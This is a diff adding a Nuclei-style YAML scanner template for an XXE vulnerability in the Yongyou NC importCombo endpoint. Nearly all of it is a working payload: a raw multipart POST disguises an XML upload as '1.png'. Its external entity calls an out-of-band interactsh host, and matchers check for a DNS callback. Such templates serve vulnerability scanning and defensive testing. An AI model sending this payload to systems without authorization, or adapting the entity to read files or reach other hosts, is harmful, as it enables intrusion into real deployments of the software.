@@ -1,0 +1,40 @@
+id: poc-yaml-yongyou-nc-importcombo-xxe
+info:
+  name: Yongyou NC importCombo XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog, xxe
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/portalcombo/importCombo?pageId=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="file"; filename="1.png"
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "http://{{reverse}}">
+        %remote;]>
+        <root/>
+        ------WebKitFormBoundary--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: header
+        words:
+          - "Error"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
